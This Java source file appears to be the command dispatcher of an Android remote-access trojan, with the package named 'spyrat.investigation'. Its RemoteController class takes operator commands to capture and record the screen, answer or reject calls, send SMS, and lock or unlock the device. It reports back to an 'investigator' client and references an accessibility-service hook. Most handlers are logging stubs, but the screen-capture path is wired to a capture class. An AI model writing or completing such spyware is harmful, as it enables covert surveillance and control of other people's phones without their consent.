package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;

public class RemoteController {
    private static final String TAG = "RemoteController";
    private Context context;
    private ScreenCapture screenCapture;
    private InvestigatorApiClient apiClient;
    
    public RemoteController(Context context) {
        this.context = context;
        this.screenCapture = new ScreenCapture(context);
        // apiClient will be set later
    }
    
    public void setApiClient(InvestigatorApiClient apiClient) {
        this.apiClient = apiClient;
    }

    public JSONObject executeCommand(String command) {
        try {
            Log.d(TAG, "Executing command: " + command);
            JSONObject result = new JSONObject();
            result.put("command", command);
            result.put("status", "executed");
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Command execution error: " + e.getMessage());
            return new JSONObject();
        }
    }

    public String takeScreenshot() {
        try {
            Log.d(TAG, "🖥️ Taking screenshot...");
            if (screenCapture != null) {
                return screenCapture.captureScreen();
            }
            return "";
        } catch (Exception e) {
            Log.e(TAG, "❌ Screenshot error: " + e.getMessage());
            return "";
        }
    }
    
    public void executeRemoteAction(String action, JSONObject parameters) {
        try {
            Log.d(TAG, "🎮 Executing remote action: " + action);
            
            if (apiClient != null) {
                JSONObject commandAck = new JSONObject();
                commandAck.put("action", action);
                commandAck.put("status", "executing");
                apiClient.sendDataToInvestigator("command_acknowledgment", commandAck);
            }
            
            switch (action) {
                case "take_screenshot":
                    takeScreenshot();
                    break;
                case "start_screen_recording":
                    startScreenRecording();
                    break;
                case "stop_screen_recording":
                    stopScreenRecording();
                    break;
                case "answer_call":
                    answerIncomingCall(parameters);
                    break;
                case "reject_call":
                    rejectIncomingCall(parameters);
                    break;
                case "send_sms":
                    sendRemoteSMS(parameters);
                    break;
                case "lock_screen":
                    lockDevice();
                    break;
                case "unlock_screen":
                    unlockDevice();
                    break;
                case "vibrate":
                    vibrateDevice();
                    break;
                case "play_sound":
                    playSound();
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown remote action: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Remote action error: " + e.getMessage());
        }
    }
    
    // Screen control methods
    public void startScreenRecording() {
        try {
            if (screenCapture != null) {
                screenCapture.startScreenRecording();
            }
            Log.d(TAG, "🎥 Screen recording started");
        } catch (Exception e) {
            Log.e(TAG, "❌ Start recording error: " + e.getMessage());
        }
    }
    
    public void stopScreenRecording() {
        try {
            if (screenCapture != null) {
                screenCapture.stopScreenRecording();
            }
            Log.d(TAG, "🎥 Screen recording stopped");
        } catch (Exception e) {
            Log.e(TAG, "❌ Stop recording error: " + e.getMessage());
        }
    }
    
    // Call control methods
    public void answerIncomingCall(JSONObject parameters) {
        try {
            Log.d(TAG, "📞 Answering incoming call...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Answer call error: " + e.getMessage());
        }
    }
    
    public void rejectIncomingCall(JSONObject parameters) {
        try {
            Log.d(TAG, "📞 Rejecting incoming call...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Reject call error: " + e.getMessage());
        }
    }
    
    public void makeCall(String phoneNumber) {
        try {
            Log.d(TAG, "📞 Making call to: " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "❌ Make call error: " + e.getMessage());
        }
    }
    
    // SMS control methods
    public void sendRemoteSMS(JSONObject parameters) {
        try {
            String phoneNumber = parameters.optString("phone_number");
            String message = parameters.optString("message");
            Log.d(TAG, "💬 Sending SMS to: " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send SMS error: " + e.getMessage());
        }
    }
    
    // Device control methods
    private void lockDevice() {
        try {
            Log.d(TAG, "🔒 Locking device...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Device lock error: " + e.getMessage());
        }
    }
    
    private void unlockDevice() {
        try {
            Log.d(TAG, "🔓 Unlocking device...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Device unlock error: " + e.getMessage());
        }
    }
    
    private void vibrateDevice() {
        try {
            Log.d(TAG, "📳 Vibrating device...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Device vibrate error: " + e.getMessage());
        }
    }
    
    private void playSound() {
        try {
            Log.d(TAG, "🔊 Playing sound...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Sound play error: " + e.getMessage());
        }
    }
    
    // Static method for accessibility service
    public static void setAccessibilityService(Object service) {
        try {
            Log.d(TAG, "Setting accessibility service...");
        } catch (Exception e) {
            Log.e(TAG, "❌ setAccessibilityService error: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        try {
            if (screenCapture != null) {
                screenCapture.cleanup();
            }
            Log.d(TAG, "🧹 RemoteController cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ RemoteController cleanup error: " + e.getMessage());
        }
    }
}
